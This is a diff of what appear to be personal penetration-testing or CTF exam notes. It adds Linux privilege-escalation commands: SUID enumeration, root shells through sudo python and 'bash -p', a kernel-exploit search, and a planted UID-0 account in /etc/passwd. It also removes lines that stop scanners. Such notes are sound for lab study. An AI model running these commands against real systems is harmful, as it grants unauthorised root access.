@@ -60,10 +60,23 @@ id
 whoami
 windows winpeas.exe   # Enumerate potential privilege escalation vectors
 
-linux SUID: 
+(SUID Binaries | linux SUID )
 find / -perm -u=s -type f 2>/dev/null
 /bin/bash -p
 https://gtfobins.github.io/
+
+(Misconfigured Sudo Permissions)
+sudo vi /etc/passwd
+sudo python -c 'import os; os.system("/bin/bash")'
+
+(Kernel Exploits)
+uname -a
+searchsploit linux kernel <version>
+
+(Exploiting Writable /etc/passwd)
+openssl passwd -1
+eviluser:x:0:0::/root:/bin/bash
+su eviluser
 
 **flag**
 cat /root/root.txt
@@ -78,14 +91,7 @@ upload flags
 prepare report
 
 ////////////////////////////////
-```bash
-systemctl stop acunetix
-systemctl stop nessusd
-systemctl disable  acunetix
-systemctl disable nessusd
-rm /usr/lib/python3.12/EXTERNALLY-MANAGED
-```
-////////////////:
+////////////////////////////////
 
 3AD and 3 individual machines 
 nmap commands
